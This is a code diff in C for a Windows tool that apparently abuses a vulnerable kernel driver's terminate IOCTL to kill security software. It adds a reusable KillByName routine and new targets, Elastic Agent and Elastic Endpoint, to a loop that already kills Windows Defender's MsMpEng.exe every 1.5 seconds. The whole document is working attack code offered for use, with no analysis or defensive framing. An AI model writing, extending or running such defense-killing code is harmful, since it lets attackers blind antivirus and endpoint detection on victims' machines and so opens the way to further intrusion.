@@ -6,6 +6,8 @@
 #define DRIVER_SYMLINK L"\\\\.\\DosK7RKScnDrv"
 #define TERMINATE_IOCTL 0x222018
 #define WINDOWS_ENGINE TRUE
+#define ELASTIC_AGENT TRUE
+#define ELASTIC_ENDPOINT TRUE
 
 typedef struct _killerBuff {
 	int PID;
@@ -42,6 +44,30 @@ int EnumerateProcess(const wchar_t* ProcessName) {
 	return pid;
 }
 
+static void KillByName(HANDLE hDriver, wchar_t* processName) {
+	DWORD PID = EnumerateProcess(processName);
+	killerBuff buff = { {NULL},PID,{NULL} };
+
+	BOOL ioctl_result;
+	DWORD bytesReturned = 0;
+	BYTE outBuffer[256];
+
+	if (PID != -1) {
+		ioctl_result = DeviceIoControl(hDriver, TERMINATE_IOCTL, &buff, sizeof(buff), &outBuffer, 256, &bytesReturned, NULL);
+		if (ioctl_result) {
+			printf("[%d] %ls Must've Died\n", PID, processName);
+		}
+		else {
+			printf("Something botched up\n");
+		}
+	}
+#ifdef _DEBUG
+	else {
+		printf("No %ls Found !\n", processName);
+	}
+#endif
+}
+
 int main(int argc, char* argv[]) {
 	DWORD bytesReturned = 0;
 	BYTE outBuffer[256];
@@ -56,22 +82,16 @@ int main(int argc, char* argv[]) {
 
 	while (1) {
 		if (WINDOWS_ENGINE) {
-			const wchar_t* targetProcess = L"MsMpEng.exe";
-			PID = EnumerateProcess(targetProcess);
-			killerBuff buff = { PID };
-			BOOL ioctl_result;
-			if (PID != -1) {
-				ioctl_result = DeviceIoControl(hDriver, TERMINATE_IOCTL, &buff, sizeof(buff), &outBuffer, 256, &bytesReturned, NULL);
-				if (ioctl_result) {
-					printf("Must've Died\n");
-				}
-				else {
-					printf("Something botched up\n");
-				}
-			}
-			else {
-				printf("No Defender Engine Found !\n");
-			}
+			wchar_t* windowsDefend = L"MsMpEng.exe";
+			KillByName(hDriver, windowsDefend);
+		}
+		if (ELASTIC_AGENT) {
+			wchar_t* elasticDefend = L"elastic-agent.exe";
+			KillByName(hDriver, elasticDefend);
+		}
+		if (ELASTIC_ENDPOINT) {
+			wchar_t* elasticDefend = L"elastic-endpoint.exe";
+			KillByName(hDriver, elasticDefend);
 		}
 		Sleep(1500);
 	}
